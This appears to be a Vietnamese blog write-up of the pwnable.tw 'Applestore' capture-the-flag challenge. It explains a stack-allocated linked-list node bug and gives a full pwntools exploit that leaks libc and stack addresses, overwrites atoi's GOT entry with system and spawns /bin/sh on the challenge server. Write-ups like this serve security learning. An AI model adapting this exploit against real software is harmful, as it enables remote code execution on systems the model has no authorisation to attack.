@@ -1,0 +1,193 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[Pwnable.tw] – Applestore // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Pwnable.tw] – Applestore"/>
+<meta name="twitter:description" content="[Pwnable.tw] – Applestore Chương trình là 1 cửa hàng bán điện thoại iphone.
+main() menu() handler() list() Liệt kê các mặt hàng trong chương trình.
+add() Thêm 1 sản phẩm vào giỏ hàng. Các sản phẩm trong giỏ hàng được lưu trên heap dưới dạng 1 double linked list, mỗi node có kiểu là struct PRODUCT. Trong đó: PRODUCT.fd là con trỏ trỏ đến node tiếp theo trong list, PRODUCT.bk là con trỏ trỏ đến node phía trước."/>
+
+    <meta property="og:title" content="[Pwnable.tw] – Applestore" />
+<meta property="og:description" content="[Pwnable.tw] – Applestore Chương trình là 1 cửa hàng bán điện thoại iphone.
+main() menu() handler() list() Liệt kê các mặt hàng trong chương trình.
+add() Thêm 1 sản phẩm vào giỏ hàng. Các sản phẩm trong giỏ hàng được lưu trên heap dưới dạng 1 double linked list, mỗi node có kiểu là struct PRODUCT. Trong đó: PRODUCT.fd là con trỏ trỏ đến node tiếp theo trong list, PRODUCT.bk là con trỏ trỏ đến node phía trước." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/applestore/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-28T19:39:48+07:00" />
+<meta property="article:modified_time" content="2021-12-28T19:39:48+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[Pwnable.tw] – Applestore</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 28, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="pwnabletw--applestorehttpspwnabletwchallenge7">[Pwnable.tw] – <a href="https://pwnable.tw/challenge/#7">Applestore</a></h2>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_checkfile.png?raw=true" alt="img"></p>
+<p>Chương trình là 1 cửa hàng bán điện thoại iphone.</p>
+<h5 id="main">main()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_main.png?raw=true" alt="img"></p>
+<h5 id="menu">menu()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_menu.png?raw=true" alt="img"></p>
+<h5 id="handler">handler()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler.png?raw=true" alt="img"></p>
+<h5 id="list">list()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler_list.png?raw=true" alt="img"></p>
+<p>Liệt kê các mặt hàng trong chương trình.</p>
+<h5 id="add">add()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler_add.png?raw=true" alt="img"></p>
+<p>Thêm 1 sản phẩm vào giỏ hàng. Các sản phẩm trong giỏ hàng được lưu trên heap dưới dạng 1 double linked list, mỗi node có kiểu là struct PRODUCT. Trong đó: PRODUCT.fd là con trỏ trỏ đến node tiếp theo trong list, PRODUCT.bk là con trỏ trỏ đến node phía trước.</p>
+<p>Hàm create() được gọi để tạo 1 node mới và đưa vào hàm insert() để chèn node vào cuối danh sách.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler_add_create.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler_add_insert.png?raw=true" alt="img"></p>
+<h5 id="delete">delete()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler_delete.png?raw=true" alt="img"></p>
+<p>Xóa 1 sản phẩm khỏi giỏ hàng bằng cách thay đổi con trỏ .fd và .bk của 2 node phía trước và phía sau nó. Hoàn toàn không có câu lệnh free() nào để giải phóng bộ nhớ cho node. Do đó không thể khai thác lỗi double free và use after free.</p>
+<h5 id="cart">cart()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler_cart.png?raw=true" alt="img"></p>
+<p>Kiểm tra giỏ hàng hiện tại, in ra cho người dùng, trả về tổng số tiền.</p>
+<h5 id="checkout">checkout()</h5>
+<p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_handler_checkout.png?raw=true" alt="img"></p>
+<p>Kiểm tra nếu tổng tiền = 7174 $ thì sẽ tặng thưởng 1 iphone 8 với giá chỉ 1 $. Khi kiểm tra điều kiện total = 7174 thỏa mãn, chương trình tạo 1 node mới để add vào cuối danh sách. Tuy nhiên node này lại không nằm trong heap mà nằm trên stack, do khai báo: PRODUCT product (lẽ ra phải là PRODUCT *product). Vì stack dễ bị thay đổi khi chương trình nhảy đến các hàm khác nên dữ liệu trên node mới này có thể điều khiển được.(iphone8)</p>
+<h3 id="exploit">Exploit</h3>
+<pre><code>+ Trước tiên phải làm cho mình được tặng cái iphone 8 thì mới có thể control node trên stack. Ta cần add 20 cái iphone 6 plus (index 2) và 6 cái iphone 6 (index 1) để đạt được điều kiện total = 20*299 + 6*199 = 7174 $.
+
++ Sau khi bypass checkout()  để tạo node product. Chương trình trở về hàm handler(). Lúc này nếu ta gọi hàm delete(), chương trình sẽ yêu cầu nhập lựa chọn và lưu vào biến choose, đây là lúc ta chèn payload để overwrite node product.
+
+![img](https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_debug_heap.png?raw=true)
+
+
++ Trong hàm delete(), sau khi đã delete node, có câu lệnh printf() để in P.name. Ta thay thế địa chỉ của atoi.got để có được atoi_address ta tính được libc_base_address, và từ đó tính ra system_address và binsh_address.
+</code></pre>
+<p>(libc_base_address) = (atoi_address) – (offset_of_atoi_in_libc)</p>
+<p>(system_address) = (libc_base_address) + (offset_of_system_in_libc)</p>
+<pre><code>+ Chúng ta leak địa chỉ của environ. Vì environ nằm trên stack nên ta tính được địa chỉ ebp của hàm delete() dựa vào offset.
+
+![img](https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_debug_leakstack1.png?raw=true)
+
+![img](https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_debug_leakstack2.png?raw=true)
+
++ Ta sẽ ghi đè got của hàm atoi() thành hàm system(). Như thế mỗi khi gọi hàm atoi(), chương trình sẽ tra bảng .GOT và lấy địa chỉ của hàm system() ra mà execute.
+</code></pre>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+#libc=ELF(&#39;/lib/i386-linux-gnu/libc-2.31.so&#39;)
+libc=ELF(&#39;libc_32.so.6&#39;)
+elf=ELF(&#39;./applestore&#39;)
+
+def add(x):
+    io.sendlineafter(&#39;&gt;&#39;,&#39;2&#39;)
+    io.sendlineafter(&#39;Device Number&gt; &#39;,str(x))
+
+def delete(x):
+    io.sendlineafter(&#39;&gt;&#39;,&#39;3&#39;)
+    io.sendlineafter(&#39;Item Number&gt;&#39;,x)
+
+def checkout():
+    io.sendlineafter(&#39;&gt;&#39;,&#39;5&#39;)
+    io.sendlineafter(&#39;&gt;&#39;,&#39;y&#39;)
+
+def cart(payload):
+    io.sendlineafter(&#39;&gt;&#39;,&#39;4&#39;)
+    io.sendlineafter(&#39;&gt;&#39;,str(payload))
+
+
+def exploit():
+    # __breakpoint=&#34;&#34;&#34;
+    #     b*0x08048beb
+    #     &#34;&#34;&#34;
+    # gdb.attach(io,__breakpoint)
+    for i in range(0,6):
+        add(1)
+    for i in range(0,20):
+        add(2)
+
+    checkout()
+
+    payload = b&#34;27&#34; + p32(elf.got[&#39;atoi&#39;]) + p32(0)*3
+    delete(payload)
+    io.recvuntil(&#39;27:&#39;)
+    # print(io.recv())
+    atoi = u32(io.recvuntil(&#39; &#39;)[:4])
+    libc.address = atoi - libc.symbols[&#39;atoi&#39;]
+
+    payload = b&#34;27&#34; + p32(libc.symbols[&#39;environ&#39;]) + p32(0)*3
+    delete(payload)
+    io.recvuntil(&#39;27:&#39;)
+    environ = u32(io.recvuntil(&#39; &#39;)[:4])
+    ebp = environ - 0x104
+
+    payload = b&#34;27&#34; + p32(0)*2 + p32(elf.got[&#39;atoi&#39;] + 0x22) + p32(ebp-0x8)
+    delete(payload)
+
+    payload = p32(libc.symbols[&#39;system&#39;]) + b&#39;;/bin//sh&#39;
+    io.sendlineafter(&#39;&gt; &#39;,payload)
+    io.interactive()
+
+
+
+debug = 0
+if debug:
+    io = process(&#39;./applestore&#39;)
+    context.log_level=&#39;DEBUG&#39;
+else:
+    io = remote(&#39;chall.pwnable.tw&#39;,10104)
+exploit()
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_flag.png?raw=true" alt="img"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
